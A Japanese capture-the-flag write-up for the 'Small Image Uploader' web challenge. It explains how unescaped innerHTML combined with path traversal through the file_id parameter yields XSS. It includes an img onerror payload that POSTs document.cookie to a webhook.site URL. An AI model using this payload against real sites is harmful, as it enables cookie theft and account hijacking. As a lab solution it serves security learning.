# Small Image Uploader

https://alpacahack.com/daily/challenges/small-image-uploader

## 問題の概要

画像ファイルをアップロード・表示する Web アプリケーションの XSS 脆弱性をついてフラグを外部に送信する問題です。

`bot` に URL を送ると、`bot` が Puppeteer を使用して Cookie にフラグを保存した状態で `web` アプリケーションにアクセスしてくれます。 XSS で Cookie を外部に送信できればフラグを入手できます。

`web` アプリケーションは Flask で次のようなエンドポイントが実装されています。

#### `GET /`

`index.html` を返します。

#### `GET /file`

`file.html` を返します。クライアント側でクエリパラメータ `file_id` を読み取って、

- 画像: `/api/file/${fileId}`
- ファイル名: `/api/filename/${fileId}`

から情報を取得して表示します。

```js
const params = new URLSearchParams(window.location.search);
const fileId = params.get("file_id");
const previewEl = document.getElementById("preview");
const filenameEl = document.getElementById("filename");
const errorEl = document.getElementById("error");

if (!fileId) {
  errorEl.textContent = "Missing file_id.";
  errorEl.hidden = false;
} else {
  previewEl.src = `/api/file/${fileId}`;
  fetch(`/api/filename/${fileId}`)
    .then((res) => (res.ok ? res.text() : null))
    .then((data) => {
      filenameEl.innerHTML = `<i>Filename: ${data}</i>`;
    });
}
```

#### `POST /api/upload`

画像ファイルを受け取って保存します。

```python
    file = request.files.get("file")

    if not file:
        return jsonify({"error": "Please upload a file"}), 400

    _, ext = os.path.splitext(file.filename)
    if ext not in [".png", ".jpg", ".jpeg", ".gif"]:
        return jsonify({"error": "Invalid extension"}), 400

    _, original_filename = os.path.split(file.filename)
    file_id = str(uuid.uuid4())
    path = f"./uploads/{file_id}{ext}"
    file_infos[file_id] = {
        "original_filename": html.escape(original_filename),
        "path": path
    }
    file.save(path)

    return jsonify({"success": True, "file_id": file_id})
```

アップロードすると UUID 形式の `file_id` が発行され、ファイルは
`path=f"./uploads/{file_id}{ext}"` に保存されます。元のファイル名は HTML エスケープされ、`file_infos` に `file_id` をキーとして `original_filename` と `path` が保存されます。

#### `GET /api/file/<file_id>`

`file_id` に対応するファイルを `file_infos` から取得し、`path` に保存されているファイルの内容を返します。

#### `GET /api/filename/<file_id>`

`file_id` に対応するファイルを `file_infos` から取得し、`original_filename` を返します。

## 解法

クライアント側で `/file/?file_id=${fileId}` にアクセスすると、`/api/filename/${fileId}` からファイル名を取得してエスケープせずに innerHTML にセットされます。

```js
fetch(`/api/filename/${fileId}`)
  .then((res) => (res.ok ? res.text() : null))
  .then((data) => {
    filenameEl.innerHTML = `<i>Filename: ${data}</i>`;
  });
```

しかし、`original_filename` はサーバー側で保存するときに HTML エスケープされているため、ファイル名をもとに XSS を仕掛けることはできません。

```python
file_infos[file_id] = {
    "original_filename": html.escape(original_filename),
    "path": path
}
```

しかし、`?file_id=` パラメータの内容は validate されないため、`file_id` に `../file/xxxxxxxx` のような値を入れてアクセスすると、`fetch` の URL に

```js
fetch('/api/filename/../file/xxxxxxxx', ...)
```

が指定され、実際には `/api/file/xxxxxxxx` にアクセスされます。

したがって、`innerHTML` にセットしたいテキストを画像の内容としてアップロードし、その `file_id` を読み込ませれば、XSS を仕掛けることができます。

## 解答に使用したコード

- [solve.py](solve.py)

データを受け取るために外部のサーバーが必要になります。今回は [webhook.site](https://webhook.site/) を使用しました。このサービスを使用すると、発行された URL に対するリクエストの内容を確認することができます。

`innerHTML` にセットする内容は、`<script>` タグなどは不活性なスクリプトとして実行されないため、`onerror` ハンドラを使用します。

```html
<img
  src="/a"
  onerror="fetch('https://webhook.site/xxxx', {method: 'POST', body: document.cookie})"
/>
```

のようなテキストを `innerHTML` にセットすると、`/a` から画像を読み込もうとしてエラーになり、`onerror` ハンドラが実行され、フラグを外部に送信できます。

このテキストを画像の内容としてアップロードし、発行された `file_id` を `?file_id=` パラメータに指定してアクセスすれば、フラグを入手できます。
